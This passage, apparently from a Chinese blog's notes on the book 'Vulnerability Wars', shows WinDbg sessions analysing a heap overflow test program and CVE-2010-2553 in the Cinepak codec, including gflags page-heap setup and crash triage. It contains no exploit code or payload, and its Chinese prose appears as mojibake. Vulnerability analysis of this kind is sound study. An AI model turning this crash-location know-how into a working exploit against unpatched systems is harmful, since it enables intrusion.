        0:000&amp;gt; dd esi
        0018ff28  41414141 41414141 41414141 41414141
        0018ff38  41414141 41414141 41414141 41414141
        0018ff48  00407000 00401327 00000001 00240f48
        0018ff58  00240f90 00000000 00000000 7efde000
        0018ff68  00000000 00000000 0018ff5c 00000000
        0018ff78  0018ffc4 00402c50 004060b8 00000000
        0018ff88  0018ff94 7563338a 7efde000 0018ffd4
        0018ff98  772f9a02 7efde000 204f7149 00000000
p
(eip=401086)
    æ­¤æ—¶å¤åˆ¶å®Œæˆ,æ­¤æ—¶çš„ç©ºé—²å †å—8705a0(ç´¢å¼•ä¸º8705a8,å †å…¥å£ä¸º8705a0)
    çœ‹çœ‹ç©ºé—²å †å—å˜æˆä»€ä¹ˆäº†
    dt _heap_free_entry 8705a0
        0:000&amp;gt; dt _heap_free_entry 8705a0
        ntdll!_HEAP_FREE_ENTRY
           +0x000 Size             : 0x4141
           +0x002 Flags            : 0x41 &#39;A&#39;
           +0x003 SmallTagIndex    : 0x41 &#39;A&#39;
           +0x000 SubSegmentCode   : 0x41414141 
           +0x004 PreviousSize     : 0x4141
           +0x006 SegmentOffset    : 0x41 &#39;A&#39;
           +0x006 LFHFlags         : 0x41 &#39;A&#39;
           +0x007 UnusedBytes      : 0x41 &#39;A&#39;
           +0x000 FunctionIndex    : 0x4141
           +0x002 ContextValue     : 0x4141
           +0x000 InterceptorValue : 0x41414141
           +0x004 UnusedBytesLength : 0x4141
           +0x006 EntryOffset      : 0x41 &#39;A&#39;
           +0x007 ExtendedBlockSignature : 0x41 &#39;A&#39;
           +0x000 Code1            : 0x41414141
           +0x004 Code2            : 0x4141
           +0x006 Code3            : 0x41 &#39;A&#39;
           +0x007 Code4            : 0x41 &#39;A&#39;
           +0x000 AgregateCode     : 0x41414141`41414141
           +0x008 FreeList         : _LIST_ENTRY [ 0x41414141 - 0x41414141 ]
    8705a0å †å—å¤´ä»¥åŠåé¢çš„FreeListä¸­çš„å‰åå‘æŒ‡é’ˆéƒ½è¢«ä¸Šé¢çš„esiä¸­çš„414141...41è¦†ç›–äº†,å¯æƒ³åé¢å†æ‰§è¡ŒHeapFreeé‡Šæ”¾å·²
    åˆ†é…çš„heapå †å—æ—¶,ä¼šå°†heapå †å—ä¸åé¢çš„ç©ºé—²å †å—8705a0è¿›è¡Œåˆå¹¶,ä¿®æ”¹ä¸¤ä¸ªåˆå¹¶å †å—çš„å‰åå‘æŒ‡é’ˆ,æ­¤æ—¶å°±ä¼šå¼•ç”¨åˆ°
    0x41414141,æœ€åé€ æˆå´©æºƒ.å¦‚æœå°†ä¸Šé¢é‡Šæ”¾å †å—çš„æ“ä½œæ¢æˆåˆ†é…å †å—HeapAlloc(hHeap,0,0x10)ä¹Ÿä¼šå¯¼è‡´å´©æºƒ,å› ä¸ºåœ¨åˆ†é…
    å †å—æ—¶ä¼šå»éå†ç©ºé—²é“¾è¡¨æŒ‡é’ˆ,é€ æˆåœ°å€å¼•ç”¨å¼‚å¸¸.è¿™é‡Œç”±äºåªæ˜¯åˆ†é…äº†ä¸€ä¸ªå †å—(ä»£ç ä¸­ä¸ºHeapAlloc(hHeap,0,0x10)),è¿™
    ä¸€ä¸ªå”¯ä¸€åˆ†é…çš„å †å—åé¢çš„å †å—æ˜¯å‰©ä¸‹çš„ç©ºé—²å †å—,å¦‚æœåˆ†é…å¤šä¸ªå †å—,å…ˆè¢«è¦†ç›–çš„å°±æ˜¯å¤šä¸ªå †å—ä¸­çš„ä¸‹ä¸€ä¸ªå †å—äº†,ä¸€èˆ¬
    ä¸ä¼šè¦†ç›–åˆ°ç©ºé—²å †å—,å¦‚æœç©ºé—²å †å—è¢«è¦†ç›–,è¯´æ˜æ‰€æœ‰çš„å·²åˆ†é…å †å—éƒ½è¢«è¦†ç›–äº†,å› ä¸ºç©ºé—²å †å—åœ¨æ‰€æœ‰å·²åˆ†é…å †å—çš„æœ€å.


åœ¨è¿™é‡Œå¯ä»¥é€šè¿‡å¯¹heapoverflowæ·»åŠ è°ƒè¯•é€‰é¡¹ç”¨äºè¾…åŠ©å †è°ƒè¯•,å¯ä½¿ç”¨windbgæä¾›çš„gflags.exe(ä½äºDebugging Tools for
windowsç›®å½•ä¸‹)æˆ–è€…!gflagå‘½ä»¤è®¾ç½®,ä¸‹é¢æ˜¯å¸¸è§çš„è°ƒè¯•é€‰é¡¹:
    htc:å †å°¾æ£€æŸ¥,åœ¨å †å—æœ«å°¾é™„åŠ é¢å¤–çš„æ ‡è®°ä¿¡æ¯(é€šå¸¸ä¸º8å­—èŠ‚),ä¸”äºæ£€æŸ¥å †å—æ˜¯å¦å‘ç”Ÿæº¢å‡º
    hfc:å †é‡Šæ”¾æ£€æŸ¥,åœ¨é‡Šæ”¾å †å—æ—¶å¯¹å †è¿›è¡Œå„ç§æ£€æŸ¥,é˜²æ­¢å¤šæ¬¡é‡Šæ”¾åŒä¸€ä¸ªå †å—
    hpc:å †å‚æ•°æ£€æŸ¥,å¯¹ä¼ é€’ç»™å †ç®¡ç†çš„å‚æ•°è¿›è¡Œæ›´å¤šçš„æ£€æŸ¥
    ust:ç”¨æˆ·æ€æ ˆå›æº¯,å³å°†æ¯æ¬¡è°ƒç”¨å †å‡½æ•°çš„å‡½æ•°è°ƒç”¨ä¿¡æ¯è®°å½•åˆ°ä¸€ä¸ªæ•°æ®åº“ä¸­
    htg:å †æ ‡å¿—,ä¸ºå †å—æ·»åŠ é™„åŠ æ ‡è®°,ä»¥è®°å½•å †å—çš„ä½¿ç”¨æƒ…å†µæˆ–å…¶ä»–ä¿¡æ¯
    hvc:è°ƒç”¨æ—¶éªŒè¯,å³æ¯æ¬¡è°ƒç”¨å †å‡½æ•°æ—¶éƒ½å¯¹æ•´ä¸ªå †è¿›è¡ŒéªŒè¯å’Œæ£€æŸ¥
    hpa:å¯ç”¨é¡µå †,åœ¨å †å—åå¢åŠ ä¸“é—¨ç”¨äºæ£€æµ‹æº¢å‡ºçš„æ …æ é¡µ,è‹¥å‘ç”Ÿå †æº¢å‡ºè§¦åŠæ …æ é¡µä¾¿ä¼šç«‹åˆ»è§¦å‘å¼‚å¸¸

    ä½¿ç”¨æ–¹æ³•:
    eg.åœ¨windbgå‘½ä»¤ä¸­è¾“å…¥:(win7éœ€è¦ç®¡ç†å‘˜èº«ä»½)
            !gflag -i app.exe +htc +hpa -htg
       åœ¨cmdä¸­è¾“å…¥:(win7éœ€è¦ç®¡ç†å‘˜èº«ä»½)
            gflags -i app.exe +htc +hpa -htg
ä¸€èˆ¬å †å°¾æ£€æŸ¥ä¸»è¦æ˜¯åœ¨æ¯ä¸ªå †å—çš„å°¾éƒ¨,å³ç”¨æˆ·æ•°æ®ä¹‹åæ·»åŠ 8å­—èŠ‚å†…å®¹,é€šå¸¸ä¸ºè¿ç»­çš„2ä¸ª0xabababab,å¦‚æœè¯¥æ®µæ•°æ®è¢«ç ´åå°±
è¯´æ˜å¯èƒ½å­˜åœ¨å †æº¢å‡º.è¿™é‡Œåœ¨heapoverflow.exeä¸­å¼€å¯htcå’Œhpc,å…·ä½“è¿‡ç¨‹å¦‚ä¸‹:

windbgä¸­ctrl+eé€‰æ‹©heapoverflow.exe
    ä¹Ÿå³windbgåŠ è½½heapoverflow.exe,å¦‚æœæ˜¯é™„åŠ è€Œä¸æ˜¯åŠ è½½,å°±æ— æ³•åœ¨å †å°¾æ·»åŠ é¢å¤–çš„æ ‡è®°ä¿¡æ¯,å³æ— æ³•è¿›è¡Œå †å°¾æ£€æŸ¥
!gflag +htc +hpc
    0:000&amp;gt; !gflag +hpc +htc
    New NtGlobalFlag contents: 0x00000050
        htc - Enable heap tail checking
        hpc - Enable heap parameter checking
g
    åœ¨windbgä¸­è¾“å…¥g,å¹¶åœ¨heapoverflow.exeçª—å£ä¸­éšæ„è¾“å…¥å­—ç¬¦å¹¶å›è½¦,ç»“æœå¦‚ä¸‹:
        0:000&amp;gt; g
        HEAP[heapoverflow.exe]: Heap block at 007C0588 modified at 007C05A0 past requested size of 10
        (1b4.11c0): Break instruction exception - code 80000003 (first chance)
        eax=007c0588 ebx=007c05a0 ecx=7733418f edx=0018fb15 esi=007c0588 edi=00000010
        eip=7739152c esp=0018fd5c ebp=0018fd5c iopl=0         nv up ei pl nz na po nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
        ntdll!RtlpBreakPointHeap+0x23:
        7739152c cc              int     3
    ç»“æœä¸­çš„heap block at 7c0588 modified at 7c05a0 past requested size of 10çš„æ„æ€æ˜¯åœ¨å †å—7c0588ä¸­,æœ‰ä¸ªåœ°å€
    7c05a0è¢«ä¿®æ”¹,å› ä¸ºè¶…è¿‡äº†åŸæ¥ç”³è¯·çš„10ä¸ªå­—èŠ‚å¤§å°.è¿™é‡Œå®é™…åˆ†é…äº†24ä¸ªå­—èŠ‚å¤§å°,æ­£å¥½æ˜¯7c05a0-7c0588=0x18çš„å€¼

é€šè¿‡è¿™é‡Œçš„è°ƒè¯•ä¿¡æ¯,å¤§ä½“å¯ä»¥åˆ¤æ–­å‡ºå †æº¢å‡ºä¸»è¦æ˜¯ç”±äºå‘å¤§å°ä¸º0x10çš„å †ä¸­å¤åˆ¶äº†è¿‡å¤šçš„æ•°æ®å¯¼è‡´çš„,ä½†æ˜¯å¹¶ä¸èƒ½å®šä½åˆ°å¯¼è‡´
æ¼æ´çš„æ±‡ç¼–æŒ‡ä»¤,æ¯”å¦‚å¯¼è‡´å †æº¢å‡ºçš„å­—èŠ‚å¤åˆ¶æŒ‡ä»¤rep movszç­‰,è€Œè¿™é‡Œçš„å †å°¾æ£€æŸ¥æ–¹å¼ä¸»è¦æ˜¯å †è¢«ç ´ååçš„åœºæ™¯,ä¸åˆ©äºå®šä½
å¯¼è‡´æ¼æ´çš„ä»£ç ,å¯ä»¥é€šè¿‡ä½¿ç”¨é¡µå †è°ƒè¯•é€‰é¡¹å®šä½æ¼æ´æŒ‡ä»¤,å…·ä½“å¦‚ä¸‹æ“ä½œ:

windbgåŠ è½½heapoverflow.exe
!gflag +hpa
    0:000&amp;gt; !gflag +hpa
    New NtGlobalFlag contents: 0x02000000
        hpa - Place heap allocations at ends of pages
g
    åœ¨windbgä¸­è¾“å…¥g,å¹¶å­˜heapoverflow.exeä¸­è¾“å…¥ä»»æ„å­—ç¬¦å¹¶å›è½¦,ç»“æœå¦‚ä¸‹:
        0:000&amp;gt; g
        (1074.e3c): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=002705a8 ebx=00000000 ecx=41414141 edx=00270590 esi=00270588 edi=00270000
        eip=772f2fe5 esp=0018fdf0 ebp=0018fed0 iopl=0         nv up ei ng nz na po cy
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
        ntdll!RtlpFreeHeap+0x4d6:
        772f2fe5 8b19            mov     ebx,dword ptr [ecx]  ds:002b:41414141=????????

kb
    0:000&amp;gt; kb
    ChildEBP RetAddr  Args to Child              
    0018fed0 772f2ce5 00270588 00270590 0018ff49 ntdll!RtlpFreeHeap+0x4d6
    0018fef0 756314bd 00270000 00000000 00270590 ntdll!RtlFreeHeap+0x142
    *** WARNING: Unable to verify checksum for image00400000
    *** ERROR: Module load completed but symbols could not be loaded for image00400000
    WARNING: Stack unwind information not available. Following frames may be wrong.
    0018ff04[00401094] 00270000 00000000 00270590 kernel32!HeapFree+0x14
    0018ff48[00401327]00000001 00540fe8 00541030 image00400000+0x1094
    0018ff88 7563338a 7efde000 0018ffd4 772f9a02 image00400000+0x1327
    0018ff94 772f9a02 7efde000 2fab3393 00000000 kernel32!BaseThreadInitThunk+0x12
    0018ffd4 772f99d5 00401273 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
    0018ffec 00000000 00401273 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b

    å…¶ä¸­kbæœ€åä¸€åˆ—ç»“æœä¸ºkbå‘½ä»¤æ‰§è¡Œçš„ç»“æœä¸­çš„å½“å‰æ’çš„ä¸Šä¸€æ’ä¸­çš„RetAddrçš„å€¼
ub image00400000+0x1094
    0:000&amp;gt; ub image00400000+0x1094
    image00400000+0x107f:
    0040107f 6a00            push    0
    00401081 c1e902          shr     ecx,2
    00401084 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    00401086 8bc8            mov     ecx,eax
    00401088 55              push    ebp
    00401089 83e103          and     ecx,3
    0040108c f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
    0040108e ff1504604000    call    dword ptr [image00400000+0x6004 (00406004)]

ub image00400000+0x1327
    0:000&amp;gt; ub image00400000+0x1327
    image00400000+0x1301:
    00401301 e847120000      call    image00400000+0x254d (0040254d)
    00401306 e8af0e0000      call    image00400000+0x21ba (004021ba)
    0040130b a150994000      mov     eax,dword ptr [image00400000+0x9950 (00409950)]
    00401310 a354994000      mov     dword ptr [image00400000+0x9954 (00409954)],eax
    00401315 50              push    eax
    00401316 ff3548994000    push    dword ptr [image00400000+0x9948 (00409948)]
    0040131c ff3544994000    push    dword ptr [image00400000+0x9944 (00409944)]
    00401322 e8d9fcffff      call    image00400000+0x1000 (00401000)

    ä¹Ÿå³ç¨‹åºå¼‚å¸¸æ—¶æ˜¯ç”±äº40108eå¤„çš„call 406004è¿™æ¡æ±‡ç¼–æŒ‡ä»¤å‡ºäº†é—®é¢˜,è€Œcall 406004è¿™å¥æŒ‡ä»¤æ‰€åœ¨çš„å‡½æ•°å¸§æ‰§æ˜¯401000
    å‡½æ•°å¸§.å› ä¸ºæ ˆä¸­å‹å…¥çš„ä¸¤ä¸ª&quot;è¿”å›åˆ°&quot;çš„åœ°å€åˆ†åˆ«ä¸º401094å’Œ401327,è€Œä¹‹æ‰€ä»¥ä¼šå‹å…¥401094æ˜¯å› ä¸ºå·²ç»æ‰§è¡Œåˆ°äº†40108eå¤„
    çš„call 406004ä¸­çš„406004å‡½æ•°å¸§ä¸­çš„æŒ‡ä»¤,ä½†æ˜¯4006004å‡½æ•°å¸§åœ¨æ²¡æœ‰è¿”å›ä¹‹å‰å¼‚å¸¸äº†,è¯´æ˜401084å¤„å¯¹åº”çš„strcpyå·²ç»æ‰§
    è¡Œå®Œæˆ,ä¹Ÿå³heapå †å·²ç»è¢«è¦†ç›–,è¿™é‡Œä¸ã€Šæ¼æ´æˆ˜äº‰ã€‹ä¹¦ä¸­ä¸åŒ,ä¹¦ä¸­å†™çš„æ˜¯æ²¡æœ‰è¦†ç›–,ä¸ºäº†ç¡®å®šå·²åˆ†é…çš„heapå †æ˜¯å¦è¢«
    è¦†ç›–,æ‰§è¡Œå¦‚ä¸‹æ“ä½œæŸ¥çœ‹:

    !heap
        0:000&amp;gt; !heap
        Details:
        Error address: 002705a0
        Heap handle: 00270000
        Error type heap_failure_buffer_overrun (6)
        Last known valid blocks: before - 00270588, after - 00270fe0
        Stack trace:
                        7734acd3: ntdll!RtlpCoalesceFreeBlocks+0x0000084c
                        772f2dfa: ntdll!RtlpFreeHeap+0x000001f4
                        772f2ce5: ntdll!RtlFreeHeap+0x00000142
                        756314bd: kernel32!HeapFree+0x00000014
        Index   Address  Name      Debugging options enabled
          1:   005a0000                
          2:   00540000                
          3:   00270000   
    !heap -h 270000
        Heap entries for Segment00 in Heap 00270000
            00270000: 00000 . 00588 [101] - busy (587)
            00270588: 00588 . 00018 [00]                                   ===&amp;gt;å¯¹åº”åˆ†é…çš„heapå †å—
            002705a0: 41728 . 20a08 [41] - busy (1c8c7), user flags (2)    ===&amp;gt;å¯¹åº”ç©ºè¡¨å¯¹åº”çš„ç©ºé—²å †å—
        è¿™é‡Œæœ‰ç‚¹å¼‚å¸¸ç°è±¡,ä¸€èˆ¬æ¥è¯´æœ€åä¸€ä¸ªå †å—å…¥å£æ˜¯ç©ºè¡¨å¯¹åº”çš„ç©ºé—²å †å—,è¿™é‡Œ&quot;ç©ºé—²å †å—&quot;å´å˜æˆäº†å ç”¨æ€,è€Œåˆ†é…çš„
        heapå †å—å˜æˆäº†&quot;ç©ºé—²&quot;æ€
    dd 270588
        0:000&amp;gt; dd 270588
        00270588  02000003 0000c315 41414141 41414141
        00270598  41414141 41414141 41414141 41414141
        002705a8  41414141 41414141 00000000 00000000
        002705b8  00000000 00000000 00000000 00000000
        002705c8  00000000 00000000 00000000 00000000
        002705d8  00000000 00000000 00000000 00000000
        002705e8  00000000 00000000 00000000 00000000
        002705f8  00000000 00000000 00000000 00000000
        è¿™é‡Œçœ‹å‡ºåˆ†é…çš„heapå †å—çš„ç¡®å·²ç»è¢«è¦†ç›–äº†è¶…è¿‡0x10é•¿åº¦çš„A
    dd 2705a0
        0:000&amp;gt; dd 2705a0
        002705a0  41414141 41414141 41414141 41414141
        002705b0  00000000 00000000 00000000 00000000
        002705c0  00000000 00000000 00000000 00000000
        002705d0  00000000 00000000 00000000 00000000
        002705e0  00000000 00000000 00000000 00000000
        002705f0  00000000 00000000 00000000 00000000
        00270600  00000000 00000000 00000000 00000000
        00270610  00000000 00000000 00000000 00000000
        è¿™é‡Œç»“åˆä¸Šé¢çš„dd 270588çš„ç»“æœå¯ä»¥çœ‹å‡º,ä¸Šé¢åˆ†é…çš„å †å—è¢«è¦†ç›–,ä¸”å¤šä½™çš„Aè¦†ç›–äº†ç©ºé—²å †å—çš„å—é¦–å’ŒflinkåŠ
        blink,è¯´æ˜çš„ç¡®æ˜¯è¦†ç›–äº†çš„,åªæ˜¯å°±ç®—è¦†ç›–äº†ç©ºé—²å †å—,ä¾ç„¶èƒ½ç”¨!gflag +hpaå®šä½æ¼æ´æŒ‡ä»¤,è€Œä¹‹æ‰€ä»¥æ²¡æœ‰å’Œä¹¦ä¸­è¯´
        çš„æ²¡æœ‰è¦†ç›–åé¢çš„ç©ºé—²å †å—ä¸åŒ,å¤§æ¦‚æ˜¯å’Œä½œè€…çš„æ“ä½œç³»ç»Ÿä¸åŒå¯¼è‡´(è¿™é‡Œç”¨çš„æ˜¯win7 x64,ä¹¦ä¸­åªè¯´æ˜¯win7),æˆ–è€…
        æ˜¯å…¶ä»–åŸå› .
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-cve-2010-2553&quot;&gt;0x02 cve-2010-2553åˆ†æ&lt;/h3&gt;

&lt;h4 id=&quot;x01-about&quot;&gt;0x01 about&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;æ¼æ´æè¿°:
    Cinepakè§†é¢‘ç¼–è§£ç å™¨ä¸­çš„iccvid.dllä¸­çš„CVDecompresså‡½æ•°åœ¨è§£å‹ç¼©åª’ä½“æ–‡ä»¶æ—¶æ²¡æœ‰å¯¹ç¼“å†²åŒºå¤§å°è¿›è¡Œæ£€æµ‹,å¯¼è‡´åœ¨å¤åˆ¶
    å‹ç¼©æ•°æ®æ—¶é€ æˆå †æº¢å‡º

å®éªŒç¯å¢ƒ:
    win xp sp3
    windows media player
    turbodiff v1.01b
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-&quot;&gt;0x02 è°ƒè¯•åˆ†æ&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;attention

    ä¹¦ä¸­p86é¡µä¸­çš„å¼€å¯é¡µå †çš„æ–¹æ³•æ˜¯å…ˆè¿è¡Œwmplayer.exe,windbgé™„åŠ è¿›ç¨‹åå†åœ¨windbgçš„å‘½ä»¤è¾“å…¥æ¡†ä¸­è¾“å…¥!gflag +hpa,å®
    é™…æ“ä½œä¸­ä¼šæç¤ºä¸èƒ½æˆåŠŸ,å³é”®ä»¥ç®¡ç†èº«ä»½è¿è¡Œä»ç„¶ä¸æˆåŠŸ,å¯èƒ½æ˜¯win xpæˆ–è€…æ˜¯windbgå’Œä¹¦ä¸­ä½œè€…çš„æœ‰ä¸€ç‚¹ä¸åŒæˆ–å…¶ä»–åŸ
    å› ,ä¸è¿‡èƒ½é€šè¿‡cmdä¸­gflags.exe -i wmplayer.exe +hpaæˆåŠŸè®¾ç½®é¡µå †,ä¹¦ä¸­p80ä¸­è¯´çš„åªèƒ½åŠ è½½exeå†åœ¨windbgä¸­è®¾ç½®è°ƒè¯•
    é€‰é¡¹ä¼¼ä¹ä¸p86æœ‰çŸ›ç›¾,ä¸è¿‡p80ä¸­æ˜¯è®¾ç½®çš„å †å°¾çš„è°ƒè¯•é€‰é¡¹,è¿™é‡Œæš‚ä¸”è®¤ä¸º:

        a&amp;gt;å †å°¾åªèƒ½ç”¨p80è¯´çš„windbgåŠ è½½æœªè¿è¡Œçš„exeåå†é€šè¿‡windbfè®¾ç½®!gflag +htc +hpcå®ç°
        b&amp;gt;é¡µå †å¯ä»¥ç”¨p86è¯´çš„windbgé™„åŠ å·²ç»è¿è¡Œçš„exeåå†è®¾ç½®!gflag +hpaå®ç°
        c&amp;gt;å®é™…æ“ä½œä¸­å¯èƒ½ç”±äºç¯å¢ƒé—®é¢˜åœ¨æœ¬æœºçš„win xp sp3ä¸Šåªèƒ½é€šè¿‡ç³»ç»Ÿcmdæ‰§è¡Œgflag.exe -i wmplayer.exe +hpa,è¿è¡Œ
          wmplayer.exe,å†ç”¨windbgé™„åŠ exeè¿›ç¨‹å®ç°,è€Œè¿™ç§æ–¹æ³•åº”è¯¥æ˜¯ç›¸å½“äºaä¸­çš„windbgåŠ è½½çš„æ–¹æ³•

2&amp;gt;æ“ä½œ

win+r:cmd
gflags.exe -i &quot;C:\Program Files\Windows Media Player\wmplayer.exe&quot; +hpa
    Current Registry Settings for wmplayer.exe executable are: 02000000
    hpa - Enable page heap
    è¿™é‡Œæ²¡æœ‰ç”¨ç®¡ç†å‘˜å®Œå…¨èº«ä»½è¿è¡Œcmdä¹Ÿå¯ä»¥æˆåŠŸ

åŒå‡»wmplayer.exe
windbgé™„åŠ wmplayer.exe
!gflag
    0:003&amp;gt; !gflag
    Current NtGlobalFlag contents: 0x02000000
    hpa - Place heap allocations at ends of pages
    windbgä¸­æ£€æŸ¥çš„ç¡®æˆåŠŸè®¾ç½®äº†hpa

g
wmplayer.exeçª—å£ä¸­æ‰“å¼€poc.avi(é…å¥—èµ„æ–™)
    (2e8.644): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00006000 ebx=07d86fc0 ecx=00000800 edx=07a3fd38 esi=10279000 edi=1027b000
    eip=73b722cc esp=07a3fd04 ebp=07a3fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:1027b000=???????? 
    ds:0023:10279000=00930093

kb
    0:010&amp;gt; kb
    ChildEBP RetAddr  Args to Child              
    07a3fd30 73b7cbf3 00000004 00000000 00000068 iccvid!CVDecompress+0x11e
    07a3fd60 73b766c8 07e0ef60 00000000 07e24fd8 iccvid!Decompress+0x11d
    07a3fdac 73b41938 07e0ef60 00000001 0000400d iccvid!DriverProc+0x1bf
    07a3fdd0 7cf8fa9e 73b5b500 0000400d 07a3fde8 MSVFW32!ICSendMessage+0x2b
    07a3fe00 7cf8f9e9 73b5b500 00000000 07e24fd8 quartz!CVFWDynLink::ICDecompress+0x3e
    07a3fec0 7cf90a55 07cf6fa8 06daac90 00000000 quartz!CAVIDec::Transform+0x282
    07a3feec 7cf90939 07cf6fa8 00000000 06dfaee0 quartz!CVideoTransformFilter::Receive+0x110
    07a3ff00 7cf8e67a 0802cf44 07cf6fa8 07a3ff40 quartz!CTransformInputPin::Receive+0x33
    07a3ff10 7cf90ca0 07cf6fa8 00040103 06dfaee0 quartz!CBaseOutputPin::Deliver+0x22
    07a3ff40 7cf90e1c 07a3ff70 07a3ff6c 7c984d69 quartz!CBaseMSRWorker::TryDeliverSample+0x102
    07a3ff84 7cf8ce30 7c984d69 06dfaee0 06dfaee0 quartz!CBaseMSRWorker::PushLoop+0x15e
    07a3ff9c 7cf8dbe6 00000000 7cf8a121 7c984d69 quartz!CBaseMSRWorker::DoRunLoop+0x4a
    07a3ffa4 7cf8a121 7c984d69 00000010 07a3ffec quartz!CBaseMSRWorker::ThreadProc+0x39
    07a3ffb4 7c80b713 06dfaee0 7c984d69 00000010 quartz!CAMThread::InitialThreadProc+0x15
    07a3ffec 00000000 7cf8a10c 06dfaee0 00000000 kernel32!BaseThreadStart+0x37


ub 73b7cbf3
æˆ–è€…
ub iccvid!Decompress+0x11d
    0:010&amp;gt; ub iccvid!Decompress+0x11d
    iccvid!Decompress+0x102:
    73b7cbd8 ffb698000000    push    dword ptr [esi+98h]
    73b7cbde 57              push    edi
    73b7cbdf ff7528          push    dword ptr [ebp+28h]
    73b7cbe2 ff752c          push    dword ptr [ebp+2Ch]
    73b7cbe5 ff7530          push    dword ptr [ebp+30h]
    73b7cbe8 ff7514          push    dword ptr [ebp+14h]
    73b7cbeb ff765c          push    dword ptr [esi+5Ch]
    73b7cbee e8bb55ffff      call    iccvid!CVDecompress (73b721ae)

ub 73b766c8
æˆ–è€…
ub iccvid!DriverProc+0x1bf
    0:010&amp;gt; ub iccvid!DriverProc+0x1bf
    iccvid!DriverProc+0x1ae:
    73b766b7 52              push    edx
    73b766b8 51              push    ecx
    73b766b9 51              push    ecx
    73b766ba ff7008          push    dword ptr [eax+8]
    73b766bd ff7004          push    dword ptr [eax+4]
    73b766c0 ff30            push    dword ptr [eax]
    73b766c2 56              push    esi
    73b766c3 e80e640000      call    iccvid!Decompress (73b7cad6)

    è¿™é‡Œå¯¹æ ˆä¸­æœ€è¿‘çš„ä¸¤ä¸ªè¿”å›åœ°å€ä»¥ä¸Šéƒ¨åˆ†è¿›è¡Œåæ±‡ç¼–,é€šè¿‡ä¸Šé¢ç»“æœå¯ä»¥çœ‹å‡º:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:1027b000=???????? 
    ds:0023:10279000=00930093 è¿™é‡Œå¼‚å¸¸æ—¶eip=73b722ccæ˜¯å±äºå‡½æ•°73b721aeä¸­çš„ä¸€å¥æŒ‡ä»¤,è€Œ73b7cbeeå¤„çš„call 73b721ae
    è¿™ä¸€æ¡æŒ‡ä»¤æ‰€åœ¨çš„å‡½æ•°å¸§æ­£æ˜¯73b7cad6å‡½æ•°å¸§,å¯é€šè¿‡æŸ¥çœ‹|åˆ†è§£|Offset:73b721aeéªŒè¯

ç°åœ¨éœ€è¦åœ¨73b7cbeeå¤„ä¸‹æ–­ç‚¹,ä½†æ˜¯iccvid.dllåªæœ‰åœ¨wmplayer.exeæ‰“å¼€poc.aviæ—¶æ‰åŠ è½½,è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å®ç°ä¸‹æ–­:
    a&amp;gt;åœ¨odæˆ–immunity debuggerä¸­å•ç‹¬åŠ è½½iccvid.dll,å¹¶åœ¨73b7cbeeä¸Šä¸‹æ–­ç‚¹åå†ç”¨odæˆ–immunity debuggeré™„åŠ 
      wmplayer.exeè¿›è¡Œåˆ†æ
    b&amp;gt;åœ¨windbgä¸­é‡æ–°é™„åŠ wmplayer.exe,å¹¶æ‰§è¡Œsxe ld:iccvid.dll,ä¹Ÿå³åœ¨iccvid.dllç¬¬ä¸€æ¬¡è¢«åŠ è½½çš„æ—¶å€™ä¸­æ–­,ä¸­æ–­åå†åœ¨
      windbgä¸­æ‰§è¡Œbp 73b7cbee

    è¿™é‡Œé‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•,è¯¦ç»†æ“ä½œå¦‚ä¸‹

win+r:cmd
gflags -i &quot;C:\Program Files\Windows Media Player\wmplayer.exe&quot; -hpa
    Current Registry Settings for wmplayer.exe executable are: 00000000
åŒå‡»è¿è¡Œwmplayer.exe
windbgé™„åŠ wmplayer.exe
!gflag
    0:003&amp;gt; !gflag
    Current NtGlobalFlag contents: 0x00000000
    å¦‚æœä¸Šé¢æ²¡æœ‰å…ˆæ‰§è¡Œgflags.exe -i ...wmplayer.exe -hpa,è¿™é‡Œåœ¨windbgä¸­æ‰§è¡Œå®Œ!gflagåç»“æœä¸­ä¼šæ˜¾ç¤ºhpaé¡µå †è¿˜å­˜åœ¨
sxe ld:iccvid.dll
sx
    0:003&amp;gt; sx
      ct - Create thread - ignore
      et - Exit thread - ignore
     cpr - Create process - ignore
     epr - Exit process - break
      ld - Load module - break
           (only break for iccvid.dll)
g
åœ¨wmplayer.exeçª—å£ä¸­æ‰“å¼€poc.avi
    0:003&amp;gt; g
    ModLoad: 73b70000 73b87000   C:\WINDOWS\system32\iccvid.dll
    eax=00000001 ebx=00000000 ecx=00000044 edx=000a2ed0 esi=00000000 edi=00000000
    eip=7c92e4f4 esp=0237e28c ebp=0237e380 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!KiFastSystemCallRet:
    7c92e4f4 c3              ret

lmm iccvid v
    0:007&amp;gt; lmm iccvid v
    start    end        module name
    73b70000 73b87000   iccvid     (deferred)             
        Image path: C:\WINDOWS\system32\iccvid.dll
        Image name: iccvid.dll
        Timestamp:        Mon Apr 14 10:12:25 2008 (4802BD89)
        CheckSum:         000219FF
        ImageSize:        00017000
        File version:     1.10.0.12
        Product version:  1.10.0.0
        File flags:       0 (Mask 3F)
        File OS:          40004 NT Win32
        File type:        3.8 Driver
        File date:        00000000.00000000
        Translations:     0409.04e4
        CompanyName:      Radius Inc.
        ProductName:      Cinepak for Windows 32
        InternalName:     iccvid
        OriginalFilename: iccvid.drv
